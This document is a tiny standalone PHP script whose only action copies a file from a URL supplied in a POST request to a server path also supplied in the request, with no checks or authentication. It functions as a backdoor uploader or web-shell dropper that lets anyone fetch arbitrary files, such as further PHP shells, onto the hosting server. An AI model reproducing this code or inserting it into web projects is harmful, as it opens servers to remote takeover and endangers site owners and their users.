<?php

function doit(){
copy($_POST['link'],$_POST['id']);
}
doit();
?>